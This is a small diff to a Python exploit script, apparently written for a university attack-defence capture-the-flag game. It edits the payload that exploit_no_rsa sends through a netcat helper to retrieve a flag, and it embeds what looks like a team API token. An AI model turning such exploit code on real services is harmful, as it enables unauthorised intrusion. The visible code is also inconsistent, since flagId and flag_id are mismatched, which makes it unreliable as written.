@@ -17,7 +17,7 @@ def netcat(hostname, port, content):
 
 def exploit_no_rsa(hostname, port, flagId):
     print 'hostname:',hostname, 'port:',port, 'flagId:', flag_id
-    content = 'S'+ "\n" + flag_id
+    content = 'S'+ "\n" + '0' + flag_id
     netcat(hostname, port, content)
 
 t = Team("http://actf0.cse545.rev.fish/", "lpmrUtF4wT1mu5FnVN6Tt82LnK1j9n5d")
